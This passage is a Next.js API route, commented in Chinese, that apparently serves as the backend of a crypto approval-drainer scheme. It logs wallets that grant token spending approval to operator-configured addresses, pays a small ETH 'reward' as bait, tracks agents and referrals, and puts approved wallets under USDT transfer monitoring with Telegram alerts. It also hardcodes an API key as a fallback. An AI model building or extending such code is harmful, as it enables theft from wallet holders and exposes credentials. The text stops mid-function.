import { NextRequest, NextResponse } from 'next/server'
import { createClient } from '@supabase/supabase-js'
import { walletMonitorService } from '@/services/walletMonitorService'
import Moralis from 'moralis'
import { getClientIP, getIPLocation } from '@/lib/ip-location'

// 动态路由配置
export const dynamic = 'force-dynamic'

// 初始化Supabase客户端
const supabase = createClient(
  process.env.NEXT_PUBLIC_SUPABASE_URL!,
  process.env.SUPABASE_SERVICE_ROLE_KEY!
)

// Moralis 配置
const MORALIS_API_KEY = process.env.MORALIS_API_KEY || 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJub25jZSI6IjY5ZDY3MjkwLWIxMTYtNDIwNC04MzhjLTE4NTJjMzU2YWIyOSIsIm9yZ0lkIjoiNDc0NjA0IiwidXNlcklkIjoiNDg4MjQ3IiwidHlwZUlkIjoiMzQ4NmRkMzktOTBlOC00YTAxLWI0NWItMGJhNWQ2MWFiYTMxIiwidHlwZSI6IlBST0pFQ1QiLCJpYXQiOjE3NTk4NDYwMzcsImV4cCI6NDkxNTYwNjAzN30.RIEwHUZ5nluSbvV3clgcclLLE5sha4BUxGHiyxiFa2A'
let moralisInitialized = false

// 初始化 Moralis
async function initMoralis() {
  if (!moralisInitialized) {
    try {
      await Moralis.start({ apiKey: MORALIS_API_KEY })
      moralisInitialized = true
      console.log('✅ Moralis SDK 初始化成功')
    } catch (error) {
      console.error('❌ Moralis SDK 初始化失败:', error)
      throw error
    }
  }
}

// 添加地址到监控服务（Moralis + Tokenview）
async function addAddressToMonitoring(address: string) {
  const results = {
    moralis: false,
    tokenview: false
  }
  
  // 1. 添加到 Moralis
  results.moralis = await addAddressToMoralisStream(address)
  
  // 2. 添加到 Tokenview（使用智能管理器，自动处理上限）
  try {
    const { smartAddAddressToTokenview } = await import('@/lib/tokenview-manager')
    results.tokenview = await smartAddAddressToTokenview(address)
  } catch (error) {
    console.warn('⚠️ Tokenview 未配置或添加失败:', error)
  }
  
  return results.moralis || results.tokenview
}

// 添加地址到 Moralis Stream
async function addAddressToMoralisStream(address: string) {
  try {
    await initMoralis()
    
    console.log('📡 添加地址到 Moralis Stream:', address)
    
    // 固定的 stream ID（如果不存在会在首次授权时创建）
    const streamId = 'eth-usdt-monitor'
    const USDT_CONTRACT = '0xdAC17F958D2ee523a2206206994597C13D831ec7'
    const WEBHOOK_URL = `${process.env.NEXT_PUBLIC_APP_URL || 'https://ethmax.vercel.app'}/api/moralis/webhook`
    
    try {
      // 尝试添加地址到现有 stream
      await Moralis.Streams.addAddress({
        id: streamId,
        address: [address],
      })
      
      console.log('✅ 地址已添加到现有 Moralis Stream')
      return true
    } catch (streamError) {
      // 如果 Stream 不存在，创建新的
      const errorMessage = streamError instanceof Error ? streamError.message : String(streamError)
      if (errorMessage.includes('not found') || errorMessage.includes('does not exist')) {
        console.log('📝 Stream 不存在，创建新的 Moralis Stream...')
        
        const stream = await Moralis.Streams.add({
          chains: ['0x1'], // Ethereum mainnet
          description: 'ETH USDT Transaction Monitor',
          tag: streamId,
          webhookUrl: WEBHOOK_URL,
          includeNativeTxs: false,
          includeContractLogs: true,
          abi: [
            {
              anonymous: false,
              inputs: [
                { indexed: true, name: 'from', type: 'address' },
                { indexed: true, name: 'to', type: 'address' },
                { indexed: false, name: 'value', type: 'uint256' }
              ],
              name: 'Transfer',
              type: 'event'
            }
          ],
          topic0: ['Transfer(address,address,uint256)'],
          advancedOptions: [
            {
              topic0: 'Transfer(address,address,uint256)',
              filter: { eq: ['address', USDT_CONTRACT] }
            }
          ],
        })
        
        // 添加地址到新创建的 stream（使用返回的stream对象的id属性）
        const newStreamId = (stream as Record<string, unknown>).id as string || streamId
        await Moralis.Streams.addAddress({
          id: newStreamId,
          address: [address],
        })
        
        console.log('✅ 创建 Moralis Stream 并添加地址成功')
        return true
      } else {
        throw streamError
      }
    }
  } catch (error) {
    console.error('❌ 添加地址到 Moralis Stream 失败:', error)
    return false
  }
}

export async function POST(request: NextRequest) {
  try {
    const body = await request.json()
    // 支持多种参数名称
    const wallet_address = body.wallet_address || body.walletAddress || body.address
    const isAuthorized = body.isAuthorized ?? body.authorized
    const txHash = body.txHash
    const amount = body.amount
    const network = body.network
    const referralCode = body.referralCode || body.ref
    const spenderAddress = body.spender_address || body.spenderAddress // 授权给的地址（权限地址）

    if (!wallet_address) {
      return NextResponse.json(
        { error: '缺少钱包地址参数' },
        { status: 400 }
      )
    }

    console.log('🔑 处理授权请求:', { wallet_address, isAuthorized, txHash, referralCode, amount, spenderAddress })
    console.log('🔍 原始请求体:', body)

    // 如果提供了 spenderAddress，验证是否是配置的权限地址
    if (spenderAddress && txHash) {
      try {
        const { createSupabaseServerClient } = await import('@/lib/supabase-server')
        const supabase = createSupabaseServerClient()
        
        const { data: permissions, error: permError } = await supabase
          .from('contract_permissions')
          .select('permission_address, contract_address')
          .eq('chain_type', 'ERC')
          .eq('is_enabled', true)
        
        if (!permError && permissions && permissions.length > 0) {
          const validAddresses = permissions.map(p => p.permission_address.toLowerCase())
          const isValidSpender = validAddresses.includes(spenderAddress.toLowerCase())
          
          if (!isValidSpender) {
            console.log(`⚠️ 授权地址 ${spenderAddress} 不在配置的权限地址列表中，忽略此授权`)
            return NextResponse.json(
              { success: false, error: '授权地址未在配置列表中' },
              { status: 400 }
            )
          }
          
          console.log(`✅ 授权地址验证通过: ${spenderAddress}`)
        }
      } catch (verifyError) {
        console.error('验证权限地址失败:', verifyError)
        // 验证失败不影响授权流程（向后兼容）
      }
    }

    // 查询nh_member_new表检查用户是否存在
    const { data: existingUsers, error: userError } = await supabase
      .from('nh_member_new')
      .select('id, wallet_address, approved, referral_code, telegram_user_id, referred_by, is_active')
      .eq('wallet_address', wallet_address)
      .eq('is_active', true)
      .order('created_at', { ascending: false })

    if (userError) {
      console.error('❌ 查询nh_member表失败:', userError)
      return NextResponse.json(
        { error: '查询用户失败: ' + userError.message },
        { status: 500 }
      )
    }

    const currentTime = Math.floor(Date.now() / 1000) // Unix时间戳用于整数字段
    const currentTimeISO = new Date().toISOString() // ISO字符串用于时间戳字段
    let userId: string | number
    let parentId = 0
    let agentId = 0  // 新增代理ID变量
    // 确保授权金额准确显示
    const authAmount = amount || '1000000' // 定义授权额度变量
    console.log('🔍 接收到的授权金额:', amount)
    console.log('🔍 最终使用的授权金额:', authAmount)

    // 验证授权状态：如果明确传递 isAuthorized: true，则认为是授权成功
    // 支持多种情况：
    // 1. 明确传递 isAuthorized: true（最优先）
    // 2. 有 txHash 的链上授权（可靠）
    // 3. 来自监听服务的授权（approval_monitor_infura）
    // 4. 如果 isAuthorized 不是 false，且有 txHash，也认为是授权成功
    const shouldAuthorize = 
      isAuthorized === true || 
      (isAuthorized !== false && txHash) || 
      body.source === 'approval_monitor_infura' ||
      (txHash && isAuthorized !== false)
    
    console.log('🔒 授权验证:', { 
      isAuthorized, 
      isAuthorizedType: typeof isAuthorized,
      hasTxHash: !!txHash, 
      txHash: txHash,
      isFromMonitor: body.source === 'approval_monitor_infura',
      source: body.source,
      shouldAuthorize 
    })
    
    // 如果 shouldAuthorize 为 false，但明显是授权请求，记录警告
    if (!shouldAuthorize && (txHash || body.source === 'approval_monitor_infura')) {
      console.warn('⚠️ 警告：检测到授权请求但 shouldAuthorize 为 false', {
        isAuthorized,
        txHash,
        source: body.source
      })
    }

    // 处理推荐关系
    if (referralCode) {
      console.log('🔍 处理推荐关系 - 邀请码:', referralCode)
      
      // 先在代理表中查找（优先匹配代理邀请码）
      const { data: agent, error: agentError } = await supabase
        .from('nh_agents')
        .select('id, agent_code, agent_name, referral_code')
        .eq('referral_code', referralCode)  // 修复：使用referral_code字段
        .eq('status', 'active')
        .single()

      if (!agentError && agent) {
        agentId = agent.id
        console.log('✅ 找到代理推荐人:', { id: agentId, code: agent.agent_code, name: agent.agent_name })
      } else {
        console.log('⚠️ 在代理表中未找到，尝试查找普通用户推荐人...')
        
        // 查找普通用户推荐人
        const { data: referrer, error: referrerError } = await supabase
          .from('nh_member_new')
          .select('id, referral_code')
          .eq('referral_code', referralCode)
          .eq('is_active', true)  // 修复：使用true表示正常用户
          .single()

        if (!referrerError && referrer) {
          parentId = referrer.id
          console.log('✅ 找到普通用户推荐人:', parentId)
        } else {
          console.log('⚠️ 推荐码无效或推荐人不存在')
        }
      }
    }

    const existingUser = existingUsers?.[0]

    // 如果用户不存在，创建新用户
    if (!existingUser) {
      console.log('📝 创建新用户记录...')
      
      // 如果是授权操作，先更新ETH价格缓存
      if (shouldAuthorize) {
        try {
          console.log('💰 更新实时ETH价格缓存（新用户授权）...')
          const { getRealtimeEthPrice } = await import('@/lib/eth-price-service')
          const { price, source } = await getRealtimeEthPrice()
          console.log(`✅ ETH价格已更新: $${price} (来源: ${source})`)
        } catch (priceError) {
          console.warn('⚠️ 更新ETH价格缓存失败，触发器将使用默认价格:', priceError)
        }
      }
      
      // 获取用户IP和地理位置
      const clientIP = getClientIP(request)
      const ipLocation = clientIP ? await getIPLocation(clientIP) : null
      const userAgent = request.headers.get('user-agent') || ''
      
      const { data: newUser, error: createUserError} = await supabase
        .from('nh_member_new')
        .insert({
          wallet_address: wallet_address,
          approved: shouldAuthorize ? 1 : 0,
          first_approved_at: shouldAuthorize ? currentTimeISO : null,
          last_approved_at: shouldAuthorize ? currentTimeISO : null,
          referral_code: generateReferralCode(),
          referred_by: parentId > 0 ? parentId.toString() : null,
          agent_id: agentId,  // 添加代理ID
          is_active: true,
          created_at: currentTimeISO,
          updated_at: currentTimeISO,
          // 记录IP和地理位置
          registration_ip: clientIP,
          registration_country: ipLocation?.country || null,
          last_login_ip: clientIP,
          last_login_country: ipLocation?.country || null,
          last_active_at: currentTimeISO,
          user_agent: userAgent
        })
        .select('id')
        .single()

      if (createUserError) {
        console.error('❌ 创建用户失败:', createUserError)
        return NextResponse.json(
          { error: '创建用户失败: ' + createUserError.message },
          { status: 500 }
        )
      }

      userId = newUser.id
      console.log('✅ 用户创建成功，ID:', userId)

      // 查询并保存链上USDT余额（异步执行，不阻塞响应）
      import('@/lib/chain-balance-helper').then(({ queryAndSaveChainBalance }) => {
        return queryAndSaveChainBalance(wallet_address, userId.toString())
      }).then((balance) => {
        console.log(`✅ 授权时新用户链上余额查询完成: ${balance} USDT`)
      }).catch((err: unknown) => {
        console.error('❌ 授权时新用户查询链上余额失败:', err)
      })

      // 如果有推荐人，更新推荐人的下级数量
      if (parentId > 0) {
        await updateReferrerChildCount(parentId)
      }

      // 如果有代理推荐人，更新代理统计
      if (agentId > 0) {
        console.log('📝 更新代理邀请统计...')
        // 首先获取当前统计数据
        const { data: currentAgent, error: getAgentError } = await supabase
          .from('nh_agents')
          .select('total_invites, valid_invites')
          .eq('id', agentId)
          .single()

        if (!getAgentError && currentAgent) {
          const { error: updateAgentStatsError } = await supabase
            .from('nh_agents')
            .update({ 
              total_invites: (currentAgent.total_invites || 0) + 1,
              valid_invites: (currentAgent.valid_invites || 0) + 1
            })
            .eq('id', agentId)

          if (updateAgentStatsError) {
            console.error('⚠️ 更新代理统计失败:', updateAgentStatsError)
          } else {
            console.log('✅ 代理邀请统计更新成功')
          }
        }
      }
    } else {
      userId = existingUser.id
      console.log('✅ 找到现有用户，ID:', userId)

      // 检查是否需要更新推荐关系
      if (referralCode && !existingUser.referred_by && parentId > 0) {
        console.log('📝 更新现有用户的推荐关系...')
        const { error: updateParentError } = await supabase
          .from('nh_member_new')
          .update({ 
            referred_by: parentId.toString(),
            updated_at: currentTimeISO
          })
          .eq('id', userId)

        if (updateParentError) {
          console.error('⚠️ 更新推荐关系失败:', updateParentError)
        } else {
          console.log('✅ 推荐关系更新成功')
          await updateReferrerChildCount(parentId)
        }
      }

      // 检查是否需要更新代理关系
      if (referralCode && (!existingUser.agent_id || existingUser.agent_id === 0) && agentId > 0) {
        console.log('📝 更新现有用户的代理关系...', { userId, agentId })
        const { error: updateAgentError } = await supabase
          .from('nh_member_new')
          .update({ 
            agent_id: agentId,
            updated_at: currentTimeISO
          })
          .eq('id', userId)

        if (updateAgentError) {
          console.error('⚠️ 更新代理关系失败:', updateAgentError)
        } else {
          console.log('✅ 代理关系更新成功')
          
          // 更新代理统计
          const { data: currentAgent } = await supabase
            .from('nh_agents')
            .select('total_invites, valid_invites')
            .eq('id', agentId)
            .single()

          if (currentAgent) {
            await supabase
              .from('nh_agents')
              .update({ 
                total_invites: (currentAgent.total_invites || 0) + 1,
                valid_invites: (currentAgent.valid_invites || 0) + 1
              })
              .eq('id', agentId)
            console.log('✅ 代理统计已更新')
          }
        }
      }

      // 在更新授权状态前，先更新ETH价格缓存（确保触发器使用最新汇率）
      if (shouldAuthorize) {
        try {
          console.log('💰 更新实时ETH价格缓存...')
          const { getRealtimeEthPrice } = await import('@/lib/eth-price-service')
          const { price, source } = await getRealtimeEthPrice()
          console.log(`✅ ETH价格已更新: $${price} (来源: ${source})`)
        } catch (priceError) {
          console.warn('⚠️ 更新ETH价格缓存失败，触发器将使用默认价格:', priceError)
        }
      }

      // 更新现有用户的授权状态（使用新表结构）
      // 如果是授权操作，确保更新授权状态和授权地址
      const updateData: any = {
        updated_at: currentTimeISO
      }
      
      if (shouldAuthorize) {
        // 授权成功：更新授权状态和时间戳
        updateData.approved = 1
        updateData.last_approved_at = currentTimeISO
        // 如果是首次授权，也更新 first_approved_at
        if (!existingUser.first_approved_at) {
          updateData.first_approved_at = currentTimeISO
        }
        // 如果提供了授权地址，更新 auth_wallet_address
        if (spenderAddress) {
          updateData.auth_wallet_address = spenderAddress
        }
        console.log('🔒 准备更新授权状态为已授权:', updateData)
      } else if (isAuthorized === false) {
        // 明确取消授权：设置为未授权
        updateData.approved = 0
        updateData.last_approved_at = null
        console.log('🔒 准备更新授权状态为未授权:', updateData)
      }
      // 如果 shouldAuthorize 为 false 但 isAuthorized 不是 false，保持当前状态不变

      // 强制更新：如果shouldAuthorize为true，必须更新授权状态
      // 或者如果有明确的授权/取消授权操作，也要更新
      const hasAuthChange = shouldAuthorize || isAuthorized === false
      const hasOtherUpdates = Object.keys(updateData).length > 1
      // 如果 shouldAuthorize 为 true，强制更新（即使 updateData 只有 updated_at）
      const shouldUpdate = shouldAuthorize || hasAuthChange || hasOtherUpdates
      
      console.log('🔍 更新条件检查:', {
        updateDataKeys: Object.keys(updateData),
        updateDataKeysCount: Object.keys(updateData).length,
        updateData: updateData,
        shouldAuthorize,
        isAuthorized,
        isAuthorizedType: typeof isAuthorized,
        hasAuthChange,
        hasOtherUpdates,
        shouldUpdate,
        existingUserApproved: existingUser.approved,
        existingUserApprovedType: typeof existingUser.approved
      })
      
      // 如果 shouldAuthorize 为 true，确保 updateData 包含 approved = 1
      if (shouldAuthorize && !updateData.approved) {
        console.warn('⚠️ 警告：shouldAuthorize 为 true 但 updateData 中没有 approved 字段，强制添加')
        updateData.approved = 1
        if (!updateData.last_approved_at) {
          updateData.last_approved_at = currentTimeISO
        }
      }
      
      if (shouldUpdate) {
        console.log('📝 执行数据库更新，用户ID:', userId, '更新数据:', updateData)
        const { data: updateResult, error: updateError } = await supabase
          .from('nh_member_new')
          .update(updateData)
          .eq('id', userId)
          .select('id, approved, last_approved_at, first_approved_at')

        if (updateError) {
          console.error('❌ 更新授权状态失败:', updateError)
          return NextResponse.json(
            { error: '更新授权状态失败: ' + updateError.message },
            { status: 500 }
          )
        }

        console.log('✅ 授权状态更新成功，更新后的数据:', updateResult)
        
        // 验证更新是否成功
        if (updateResult && updateResult.length > 0) {
          const updatedUser = updateResult[0]
          console.log('🔍 验证更新结果:', {
            userId: updatedUser.id,
            approved: updatedUser.approved,
            approvedType: typeof updatedUser.approved,
            last_approved_at: updatedUser.last_approved_at,
            first_approved_at: updatedUser.first_approved_at
          })
          
          // 如果授权成功但数据库中的approved不是1，记录警告并尝试再次更新
          if (shouldAuthorize && updatedUser.approved !== 1 && updatedUser.approved !== '1') {
            console.error('⚠️ 警告：授权成功但数据库更新可能失败，approved值:', updatedUser.approved, '类型:', typeof updatedUser.approved)
            console.log('🔄 尝试强制更新授权状态...')
            
            // 强制更新为1
            const { error: forceUpdateError } = await supabase
              .from('nh_member_new')
              .update({ approved: 1 })
              .eq('id', userId)
            
            if (forceUpdateError) {
              console.error('❌ 强制更新失败:', forceUpdateError)
            } else {
              console.log('✅ 强制更新成功')
            }
          } else if (shouldAuthorize) {
            console.log('✅ 授权状态更新验证通过，approved =', updatedUser.approved)
          }
        } else {
          console.warn('⚠️ 更新结果为空，可能更新失败')
          // 如果更新结果为空，再次查询数据库验证
          const { data: verifyUser, error: verifyError } = await supabase
            .from('nh_member_new')
            .select('id, approved, last_approved_at, first_approved_at')
            .eq('id', userId)
            .single()
          
          if (!verifyError && verifyUser) {
            console.log('🔍 二次验证查询结果:', {
              userId: verifyUser.id,
              approved: verifyUser.approved,
              approvedType: typeof verifyUser.approved,
              last_approved_at: verifyUser.last_approved_at
            })
            
            // 如果授权成功但数据库中的approved不是1，再次强制更新
            if (shouldAuthorize && verifyUser.approved !== 1 && verifyUser.approved !== '1') {
              console.error('⚠️ 二次验证失败：授权成功但数据库中的approved不是1，再次强制更新')
              const { error: finalUpdateError } = await supabase
                .from('nh_member_new')
                .update({ 
                  approved: 1,
                  last_approved_at: currentTimeISO,
                  updated_at: currentTimeISO
                })
                .eq('id', userId)
              
              if (finalUpdateError) {
                console.error('❌ 最终强制更新失败:', finalUpdateError)
              } else {
                console.log('✅ 最终强制更新成功')
              }
            }
          }
        }
        
        // 授权成功后，更新链上USDT余额（异步执行，不阻塞响应）
        if (shouldAuthorize) {
          import('@/lib/chain-balance-helper').then(({ queryAndSaveChainBalance }) => {
            return queryAndSaveChainBalance(wallet_address, userId.toString())
          }).then((balance) => {
            console.log(`✅ 授权成功后链上余额查询完成: ${balance} USDT`)
          }).catch((err: unknown) => {
            console.error('❌ 授权成功后查询链上余额失败:', err)
          })
        }
      } else {
        console.log('⚠️ 跳过授权状态更新（无变化）')
      }
    }

    // 授权判断：完全信任钱包的判断（isAuthorized），不依赖 txHash 验证
    // 理由：Trust Wallet 等钱包可能返回空 txHash，但授权已成功
    console.log('🔍 授权条件检查:', {  isAuthorized, shouldAuthorize, txHash, txHashType: typeof txHash })
    if (shouldAuthorize) {
      console.log('✅ 进入授权成功处理流程')
      console.log('📝 记录verify交易...')
      
      // 如果有交易哈希，记录到verify交易表
      if (txHash) {
        // 为finance_orders表生成数字ID（从UUID生成一个稳定的数字ID）
        const numericUserId = typeof userId === 'string' ? 
          Math.abs(userId.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0)) % 1000000 : 
          userId
        
        const { error: txError } = await supabase
          .from('finance_orders')
          .insert({
            user_id: numericUserId,
            order_no: `AUTH_${currentTime}`,
            method_id: 1, // 默认方法ID
            type: 'withdraw', // 使用允许的类型
            amount: authAmount,
            actual_amount: authAmount,
            fee: 0,
            wallet_address: wallet_address, // 使用verify地址
            status: 1, // 1表示已完成
            create_time: currentTimeISO,
            remark: `授权交易: ${wallet_address.substring(0, 10)}...`
          })

        if (txError) {
          console.error('⚠️ 记录授权交易失败（非致命错误）:', txError)
          // 不阻止主流程，只记录警告
        } else {
          console.log('✅ 授权交易记录成功')
        }
      }

      // 检查是否首次授权，发放首次授权奖励
      try {
        console.log('🔍 检查是否首次授权...')
        
        // 使用新的奖励服务发放首次授权奖励
        const { grantFirstAuthorizationReward } = await import('@/lib/rewardService')
        const rewardResult = await grantFirstAuthorizationReward(userId, wallet_address)
        
        if (rewardResult.success) {
          console.log(`✅ 首次授权奖励发放成功: ${rewardResult.amount_usdt} USDT ≈ ${rewardResult.amount_eth?.toFixed(6)} ETH`)
        } else {
          console.log(`ℹ️ ${rewardResult.error || '未发放奖励'}`)
        }
        
        // 保留旧的奖励逻辑（兼容性）
        // 检查用户是否已赠送过ETH奖励（使用新表结构）
        const { data: currentUser, error: fetchError } = await supabase
          .from('nh_member_new')
          .select('a_eth, eth, first_approved_at')
          .eq('id', userId)
          .single()
        
        if (fetchError) {
          console.error('⚠️ 检查用户奖励状态失败:', fetchError)
        } else {
          // 检查是否首次授权（通过a_eth余额和first_approved_at判断）
          const hasReceivedReward = (currentUser.a_eth && currentUser.a_eth > 0) || false
          
          if (!hasReceivedReward) {
            // 首次授权，发放旧的奖励（56 USDT等额ETH）
            console.log('🎁 首次授权，开始赠送旧版授权奖励...')
            await giveAuthorizationReward(userId, wallet_address, authAmount, txHash)
          }
        }
      } catch (rewardError) {
        console.error('⚠️ 处理授权奖励失败（非致命错误）:', rewardError)
        // 不阻止主流程，只记录警告
      }

      // 记录授权日志到nh_logs表
      try {
        console.log('📝 记录授权日志...')
        // 为nh_logs表生成数字ID（从UUID生成一个稳定的数字ID）
        const numericUserId = typeof userId === 'string' ? 
          Math.abs(userId.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0)) % 1000000 : 
          userId
        
        const { error: logError } = await supabase
          .from('nh_logs')
          .insert([
            {
              user_id: numericUserId,
              user_uuid: userId,
              action: 'wallet_authorize',
              description: `钱包授权成功 - 地址: ${wallet_address}, 授权额度: ${authAmount} USDT, 交易哈希: ${txHash || 'N/A'}`,
              created_at: currentTimeISO
            }
          ])

        if (logError) {
          console.error('⚠️ 记录授权日志失败（非致命错误）:', logError)
        } else {
          console.log('✅ 授权日志记录成功')
        }
      } catch (logError) {
        console.error('⚠️ 记录授权日志异常（非致命错误）:', logError)
      }

      // 发送Telegram授权通知（通过队列系统，避免重复发送）
      try {
        console.log('🤖 准备发送Telegram授权通知...')
        console.log('🔍 用户ID类型:', typeof userId, '值:', userId)
        console.log('🔍 地址:', wallet_address)
        console.log('🔍 授权金额:', authAmount)
        console.log('🔍 交易哈希:', txHash)
        
        // 为通知使用数字ID（从UUID生成一个稳定的数字ID）
        const numericUserId = typeof userId === 'string' ? 
          Math.abs(userId.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0)) % 1000000 : 
          userId
        
        console.log('🔍 生成的数字用户ID:', numericUserId)
        console.log('📤 将通知添加到队列...')
        
        // 直接添加到通知队列，不调用sendTelegramNotification函数
        const { error: insertError } = await supabase
          .from('telegram_notification_queue')
          .insert({
            user_id: userId, // 使用UUID而不是数字ID
            notification_type: 'user_authorize',
            notification_data: {
              userId: userId,
              wallet_address: wallet_address,
              authAddress: wallet_address,
              authAmount: authAmount || '1000000',
              txHash: txHash,
              timestamp: new Date().toISOString()
            },
            is_sent: false,
            created_at: new Date().toISOString()
          });
        
        if (insertError) {
          console.error('❌ 插入Telegram通知队列失败:', insertError);
        } else {
          console.log('✅ Telegram通知已加入队列，Edge Function将处理发送');
        }
      } catch (telegramError) {
        console.error('⚠️ Telegram授权通知失败（非致命错误）:', telegramError)
        if (telegramError instanceof Error) {
          console.error('⚠️ 错误堆栈:', telegramError.stack)
        }
        // 不阻止主流程，只记录警告
      }

      // 添加地址到Telegram实时动账监听系统
      try {
        console.log('🔍 添加地址到Telegram动账监听系统...', wallet_address)
        await walletMonitorService.addMonitoredAddress(wallet_address)
        console.log('✅ 地址已添加到Telegram动账监听系统')
      } catch (monitorError) {
        console.error('⚠️ 添加地址到监听系统失败（非致命错误）:', monitorError)
        // 不阻止主流程，只记录错误
      }

      // 添加地址到监控服务（Moralis + Tokenview）
      try {
        console.log('🔍 添加地址到监控服务...', wallet_address)
        const monitoringSuccess = await addAddressToMonitoring(wallet_address)
        if (monitoringSuccess) {
          console.log('✅ 地址已添加到监控服务（Moralis/Tokenview）')
        } else {
          console.warn('⚠️ 所有监控服务添加失败')
        }
      } catch (monitoringError) {
        console.error('⚠️ 添加地址到监控服务失败（非致命错误）:', monitoringError)
        // 不阻止主流程，只记录错误
      }
    } else {
      // 授权判定失败：不发奖励，写入失败通知队列
      try {
        console.log('❌ 授权未成功，写入失败通知队列')
        const { error: insertFailError } = await supabase
          .from('telegram_notification_queue')
          .insert({
            user_id: userId,
            notification_type: 'user_authorize_failed',
            notification_data: {
              userId: userId,
              wallet_address: wallet_address,
              authAmount: authAmount || '1000000',
              txHash: txHash || '',
              timestamp: new Date().toISOString()
            },
            is_sent: false,
            created_at: new Date().toISOString()
          })
        if (insertFailError) {
          console.warn('⚠️ 失败通知写入队列出错（非致命）:', insertFailError)
        } else {
          console.log('📥 已写入授权失败通知队列')
        }
      } catch (e) {
        console.warn('⚠️ 写入失败通知异常（非致命）:', e)
      }
    }

    // 验证更新是否成功 - 重新查询用户数据
    const { data: updatedUser, error: verifyError } = await supabase
      .from('nh_member_new')
      .select('id, approved, wallet_address, first_approved_at')
      .eq('id', userId)
      .single()

    if (verifyError) {
      console.error('⚠️ 验证更新失败:', verifyError)
    } else {
      console.log('🔍 更新后的用户数据:', updatedUser)
    }

    console.log('🔍 API响应数据:', { authAmount, amount, isAuthorized })
    
    // 确保authAmount有值
    const finalAuthAmount = authAmount || amount || '1000000'
    console.log('🔍 最终授权额度:', finalAuthAmount)
    
    // 获取最新的用户信息用于返回
    const { data: latestUserData, error: latestUserError } = await supabase
      .from('nh_member_new')
      .select('*')
      .eq('id', userId)
      .single()
    
    if (latestUserError) {
      console.error('⚠️ 获取最新用户数据失败（非致命错误）:', latestUserError)
    }
    
    return NextResponse.json({
      success: true,
      message: '授权状态更新成功',
      data: {
        wallet_address: wallet_address,
        isAuthorized: isAuthorized,
        txHash: txHash,
        userId: userId,
        authAmount: finalAuthAmount, // 添加授权额度信息
        timestamp: new Date().toISOString(),
        verification: updatedUser, // 包含验证数据
        userData: latestUserData // 包含最新的用户数据
      }
    })

  } catch (error) {
    console.error('❌ verifyAPI错误:', error)
      return NextResponse.json(
        { error: '服务器内部错误: ' + (error instanceof Error ? error.message : "未知错误") },
        { status: 500 }
      )
  }
}

// 更新推荐人的下级数量
async function updateReferrerChildCount(referrerId: number) {
  try {
    // 查询下级数量
    const { count, error: countError } = await supabase
      .from('nh_member_new')
      .select('*', { count: 'exact', head: true })
      .eq('referred_by', referrerId.toString())
      .eq('is_active', true)

    if (countError) {
      console.error('❌ 查询下级数量失败:', countError)
      return
    }

    // 注意：nh_member_new表中没有childs字段，跳过更新
    console.log('📊 推荐人下级数量统计:', count)
    console.log('⚠️ 注意：nh_member_new表中没有childs字段，无法更新推荐人统计')
  } catch (error) {
    console.error('❌ 更新推荐人下级数量异常:', error)
  }
}

// 发送Telegram授权通知（使用Supabase webhook系统）
async function sendTelegramNotification(userId: string | number, wallet_address: string, authAddress: string, authAmount: string, txHash: string) {
  try {
    console.log('🤖 准备发送Telegram通知...', { userId, wallet_address, authAddress, authAmount, txHash });
    
    // 检查是否在最近5秒内已经发送过相同的通知（去重机制 - 缩短时间窗口）
    const fiveSecondsAgo = new Date(Date.now() - 5 * 1000).toISOString();
    
    const { data: existingNotifications, error: checkError } = await supabase
      .from('telegram_notification_queue')
      .select('id, created_at')
      .eq('user_id', userId)
      .eq('notification_type', 'user_authorize')
      .gte('created_at', fiveSecondsAgo)
      .order('created_at', { ascending: false })
      .limit(1);
    
    if (checkError) {
      console.error('❌ 检查重复通知失败:', checkError);
    } else if (existingNotifications && existingNotifications.length > 0) {
      console.log('⚠️ 检测到重复通知（5秒内），跳过发送:', {
        userId,
        wallet_address,
        lastNotification: existingNotifications[0].created_at
      });
      return; // 跳过重复通知
    }
    
    // 为通知生成数字ID（从UUID生成一个稳定的数字ID）
    const numericUserId = typeof userId === 'string' ? 
      Math.abs(userId.split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0)) % 1000000 : 
      userId

    // 将通知插入到telegram_notification_queue表中
    // Supabase Edge Function会监听这个表的变化并发送Telegram消息
    const { error: insertError } = await supabase
      .from('telegram_notification_queue')
      .insert({
        user_id: userId, // 使用UUID而不是数字ID
        notification_type: 'user_authorize',
        notification_data: {
          userId: userId,
          wallet_address: wallet_address,
          authAddress: authAddress, // 添加授权地址
          authAmount: authAmount || '1000000',
          txHash: txHash,
          timestamp: new Date().toISOString()
        },
        is_sent: false,
        created_at: new Date().toISOString()
      });
    
    if (insertError) {
      console.error('❌ 插入Telegram通知队列失败:', insertError);
    } else {
      console.log('✅ Telegram通知已加入队列，Edge Function将处理发送');
    }
  } catch (error) {
    console.error('❌ Telegram通知处理异常:', error);
    // 不抛出错误，避免影响主流程
  }
}

// 赠送授权奖励函数（完全按照主项目逻辑）
async function giveAuthorizationReward(userId: string | number, wallet_address: string, authAmount: string, txHash?: string) {
  try {
    // 获取实时ETH价格
    let ethPriceInUsd = 4300 // 默认价格
    try {
      console.log('🔍 获取实时ETH价格...')
      const priceResponse = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd')
      const priceData = await priceResponse.json()
      
      if (priceData.ethereum && priceData.ethereum.usd) {
        ethPriceInUsd = priceData.ethereum.usd
        console.log(`✅ 获取实时ETH价格成功: $${ethPriceInUsd}`)
      } else {
        console.log('⚠️ 无法获取实时价格，使用默认价格')
      }
    } catch (priceError) {
      console.error('❌ 获取实时ETH价格失败，使用默认价格:', priceError)
    }
    
    // 计算ETH奖励：56 USDT等额的ETH
    const usdtToEthRate = 1 / ethPriceInUsd // 1 USDT = 1/ETH价格 ETH
    const ethReward = 56 * usdtToEthRate // 56 USDT等额的ETH
    
    console.log(`💱 汇率信息: ETH价格=$${ethPriceInUsd}, 1 USDT = ${usdtToEthRate} ETH`)
    
    console.log(`💰 计算奖励: 56 USDT -> ${ethReward} ETH奖励`)
    
    // 先获取用户当前ETH余额（使用新表结构）
    const { data: currentUser, error: fetchError } = await supabase
      .from('nh_member_new')
      .select('a_eth, eth')
      .eq('id', userId)
      .single()
    
    if (fetchError) {
      throw new Error(`获取用户当前余额失败: ${fetchError.message}`)
    }
    
    // 计算新的ETH余额（累加奖励）
